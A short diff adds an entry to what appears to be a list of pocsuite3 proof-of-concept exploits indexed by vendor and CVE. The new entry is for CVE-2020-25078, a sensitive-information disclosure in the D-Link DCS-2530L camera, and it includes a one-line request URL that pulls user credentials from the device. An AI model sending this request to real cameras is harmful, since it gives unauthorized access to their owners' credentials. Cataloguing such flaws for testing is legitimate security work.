@@ -18,6 +18,14 @@ pocsuite3
 ## Confluence
 - 🎯 cve-2019-3396(Atlassian Confluence 路径穿越漏洞)
 
+## D-Link
+- 🎯 cve-2020-25078(D-Link DCS-2530L 敏感信息泄露漏洞)
+```
+poc:
+https://target/config/getuser?index=0
+```
+
+
 ## Eyou(亿邮)
 - 🎯 wooyun-2013-028987
 - 🎯 wooyun-2014-056245
